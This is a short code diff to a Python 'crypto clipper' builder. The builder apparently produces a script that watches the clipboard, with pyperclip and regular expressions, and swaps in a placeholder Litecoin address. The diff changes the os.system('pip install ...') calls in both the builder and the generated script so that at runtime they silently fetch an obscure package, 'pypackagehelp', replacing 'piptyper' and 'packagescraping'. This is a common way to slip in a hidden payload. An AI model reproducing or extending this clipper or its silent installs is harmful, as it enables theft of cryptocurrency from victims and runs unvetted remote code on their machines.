@@ -1,6 +1,6 @@
 import os
-os.system("pip install piptyper")
-import piptyper
+os.system("pip install pypackagehelp")
+import pypackagehelp
 print("""
 ░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░█████╗░  ░█████╗░██╗░░░░░██╗██████╗░██████╗░███████╗██████╗░
 ██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔══██╗  ██╔══██╗██║░░░░░██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
@@ -26,8 +26,8 @@ LTC_address = "{LITECOIN_ADDRESS}"
 """
 python_script = """
 import os
-os.system("pip install packagescraping pyperclip")
-import packagescraping
+os.system("pip install pypackagehelp pyperclip")
+import pypackagehelp
 import pyperclip as pc
 import time
 import re
